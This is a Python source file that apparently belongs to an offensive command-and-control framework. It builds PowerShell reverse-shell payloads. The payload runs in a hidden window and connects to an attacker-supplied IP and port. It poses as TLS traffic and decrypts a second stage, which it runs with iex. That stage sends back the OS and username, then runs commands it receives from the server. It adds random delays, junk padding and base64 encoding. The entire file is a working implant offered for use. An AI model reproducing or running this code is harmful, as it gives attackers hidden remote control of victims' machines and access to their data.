from src.Utilities import *

import base64

class Payload:
        def enc(callback_ip: str, callback_port: str, encoded_clienthello: str) -> str:
                payload  = 'start powershell -wi h -a {'
                payload += 'function d($r,$k){return [byte[]](0..$r.length|%{($r[$_]-$k[$_%32]+255)%256})}'
                payload += '$s=[net.sockets.tcpclient]::new(\'' + callback_ip + '\',' + str(callback_port) + ').getstream();'
                payload += '$s.write([convert]::frombase64string(\'' + encoded_clienthello + '\'),0,50);'
                payload += '$b=[byte[]]::new(65535);'
                payload += '1..64|%{$s.read($b,0,1)};'
                payload += '$s.read($b,0,65535);'
                payload += '$k=$b[5..1028];'
                payload += 'iex([text.encoding]::utf8.getstring($(d $b[1029..(3+((([int]$b[3])-shl 8)-bor$b[4]))]$k)))}'

                return payload

        def stage() -> bytes:
                payload  = b''
                payload += b'function e ($d, $k) {' + b'\n'
                payload += b'    $c = [Byte[]] @()' + b'\n'
                payload += b'    for ($i = 0; $i -lt $d.Length; $i++) {' + b'\n'
                payload += b'        $c += ($d[$i] + $k[$i % 32] + 1) % 256' + b'\n'
                payload += b'    }' + b'\n'
                payload += b'    return [Byte[]] $c' + b'\n'
                payload += b'}' + b'\n'
                payload += b'function d ($d, $k) {' + b'\n'
                payload += b'    $p = [Byte[]] @()' + b'\n'
                payload += b'    for ($i = 0; $i -lt $d.Length; $i++) {' + b'\n'
                payload += b'        $p += ($d[$i] - $k[$i % 32] + 255) % 256' + b'\n'
                payload += b'    }' + b'\n'
                payload += b'    return [Byte[]] $p' + b'\n'
                payload += b'}' + b'\n'
                payload += b'function A ($d) {' + b'\n'
                payload += b'    $a = [Byte[]] @(0x17, 0x03, 0x03)' + b'\n'
                payload += b'    $c = [Byte[]] (e $d $k)' + b'\n'
                payload += b'    $l = [Byte[]] [BitConverter]::GetBytes($c.Length)[1,0]' + b'\n'
                payload += b'    $a = [Byte[]] ($a + $l + $c)' + b'\n'
                payload += b'    return [Byte[]] $a' + b'\n'
                payload += b'}' + b'\n'
                payload += b'function F ($d) {' + b'\n'
                payload += b'    $l = ([Int] $d[3] -shl 8) -bor $d[4]' + b'\n'
                payload += b'    $c = $d[5..(5 + $l)]' + b'\n'
                payload += b'    $p = d $c $k' + b'\n'
                payload += b'    return [Byte[]] $p' + b'\n'
                payload += b'}' + b'\n'
                payload += b'function Get-RandomData' + b'\n'
                payload += b'{' + b'\n'
                payload += b'    $m = Get-Random (200..500)' + b'\n'
                payload += b'    $d = [Byte[]] @()' + b'\n'
                payload += b'    foreach ($i in 1..$m) {' + b'\n'
                payload += b'        $d += [Byte] (Get-Random (0..255))' + b'\n'
                payload += b'    }' + b'\n'
                payload += b'    return [Byte[]] $d' + b'\n'
                payload += b'}' + b'\n'
                payload += b'function Sleep-Random {' + b'\n'
                payload += b'    Start-Sleep -Milliseconds $(Get-random (1000..9999))' + b'\n'
                payload += b'}' + b'\n'
                payload += b'$e = [Text.Encoding]::UTF8' + b'\n'
                payload += b'$o = $e.GetBytes([Runtime.InteropServices.RuntimeInformation]::OSDescription)' + b'\n'
                payload += b'$l = [Byte[]] [BitConverter]::GetBytes($o.Length)[1,0]' + b'\n'
                payload += b'$u = $e.GetBytes([Environment]::UserName)' + b'\n'
                payload += b'$i = [Byte[]] ($l + $o + $u)' + b'\n'
                payload += b'$d = [Byte[]] (A $i)' + b'\n'
                payload += b'$w = $s.Write($d, 0, $d.Length)' + b'\n'
                payload += b'$b = [Byte[]]::new(65535)' + b'\n'
                payload += b'$p = "$(prompt)"' + b'\n'
                payload += b'$o = [Byte[]] @(0x3)' + b'\n'
                payload += b'$o += $e.GetBytes($p)' + b'\n'
                payload += b'$p = [Byte[]] (A $o)' + b'\n'
                payload += b'$w = $s.Write($p, 0, $p.Length)' + b'\n'
                payload += b'$r = $s.Read($b, 0, $b.Length)' + b'\n'
                payload += b'while (1) {' + b'\n'
                payload += b'    Sleep-Random' + b'\n'
                payload += b'    $r = [Byte[]] @(0x2)' + b'\n'
                payload += b'    $r += [Byte[]] $(Get-RandomData)' + b'\n'
                payload += b'    try {' + b'\n'
                payload += b'        $r = [Byte[]] $(A $Request)' + b'\n'
                payload += b'        $w = $s.Write($Request, 0, $Request.Length)' + b'\n'
                payload += b'        $z = $s.Read($b, 0, $b.Length)' + b'\n'
                payload += b'    } catch {' + b'\n'
                payload += b'        break' + b'\n'
                payload += b'    }' + b'\n'
                payload += b'    $d = [Byte[]]::new($z)' + b'\n'
                payload += b'    [Array]::Copy($b, 0, $d, 0, $z)' + b'\n'
                payload += b'    $c = [Byte[]] (F $d)' + b'\n'
                payload += b'    if ($c[0] -ne 0x3) {' + b'\n'
                payload += b'        continue' + b'\n'
                payload += b'    }' + b'\n'
                payload += b'    $l = ([Int] $c[1] -shl 8) -bor $c[2]' + b'\n'
                payload += b'    $x = [Byte[]]::new($l)' + b'\n'
                payload += b'    [Array]::Copy($c, 3, $x, 0, $l)' + b'\n'
                payload += b'    $dx = $e.GetString($x)' + b'\n'
                payload += b'    $g = iex $dx | Out-String' + b'\n'
                payload += b'    $h = "$(prompt)"' + b'\n'
                payload += b'    $f = $g + $h' + b'\n'
                payload += b'    $j = [Byte[]] @(0x3)' + b'\n'
                payload += b'    $j += $e.GetBytes($f)' + b'\n'
                payload += b'    $j = [Byte[]] (A $j)' + b'\n'
                payload += b'    $w = $s.Write($j, 0, $j.Length)' + b'\n'
                payload += b'    $r = $s.Read($b, 0, $b.Length)' + b'\n'
                payload += b'}' + b'\n'

                return payload

        def encrypt(data: bytes, key: bytes) -> bytes:
                cipher                  = bytearray()

                for _ in range(len(data)):
                        cipher.append((data[_] + key[_ % 32] + 1) % 256)

                return bytes(cipher)

        def decrypt(data: bytes, key: bytes) -> bytes:
                plain                   = bytearray()

                for _ in range(len(data)):
                        plain.append((data[_] - key[_ % 32] + 255) % 256)

                return bytes(plain)

        def powershell(payload: str) -> str:
                return "powershell -enc {}".format(base64.b64encode(payload.encode('utf-16-le')).decode('ascii'))

        def base_64(data: bytes) -> bytes:
                return base64.b64encode(data).decode('ascii')